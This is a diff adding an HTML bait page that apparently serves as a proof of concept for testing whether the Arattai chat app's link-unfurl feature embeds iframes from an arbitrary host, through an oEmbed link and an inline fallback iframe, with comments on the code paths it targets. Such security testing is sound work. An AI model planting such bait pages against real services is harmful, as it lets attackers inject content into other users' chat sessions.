@@ -1,0 +1,46 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Arattai unfurl iframe embed probe</title>
+<!--
+  Bait page for testing whether Arattai's server-side link-unfurl fetcher will
+  embed an attacker-controlled iframe from an unrelated https host into the
+  chat UI. Covers two possible extraction paths seen in LinkUnfurlMessage.vue:
+
+  1. True oEmbed discovery: the fetcher follows this <link rel="alternate"
+     type="application/json+oembed"> tag, reads the JSON's "html" field, and
+     extractIframeSrc() regex-matches the <iframe src="..."> inside it.
+  2. Raw-page scraping: the fetcher never calls oEmbed discovery and instead
+     stores this page's own rendered HTML (or an <iframe> found in it)
+     directly as urlInfo.html - covered by the inline <iframe> below.
+
+  Note: the resulting iframe src is passed through $Util.sanitizeURL(), which
+  allowlists only https:/ftp:/tel:/mailto:/sms:/zoommtg:/teams: schemes, so
+  this only proves arbitrary-HOST iframe embedding (no hostname allowlist),
+  not a javascript:/data: scheme bypass - that combination is already
+  filtered client-side for this specific sink.
+
+  Before using: replace PLACEHOLDER_BASE_URL below and in oembed.json with
+  this page's real hosted base URL (e.g. https://<user>.github.io/<repo>).
+-->
+<link rel="alternate" type="application/json+oembed"
+      href="https://josangeorge.github.io/massah/unfurl-abuse/oembed.json"
+      title="Arattai unfurl iframe probe">
+<meta property="og:title" content="Arattai unfurl iframe embed probe">
+<meta property="og:type" content="video.other">
+</head>
+<body>
+<h1>Arattai unfurl iframe embed probe</h1>
+<p>This page is bait for an authorized XSS test. Send this page's real hosted URL
+as a chat message and check whether the resulting unfurl card renders an iframe
+(click to expand if it only becomes visible on interaction). If it does, open
+devtools on the parent page and inspect the iframe's <code>src</code> and
+<code>sandbox</code> attributes, and watch <code>impact-frame.html</code>'s own
+on-page log for what it could observe about its embedding context.</p>
+
+<!-- Fallback in case the fetcher scrapes this page's raw HTML for an <iframe>
+     rather than following oEmbed discovery. -->
+<iframe src="PLACEHOLDER_BASE_URL/impact-frame.html" width="600" height="209" frameborder="0"></iframe>
+</body>
+</html>
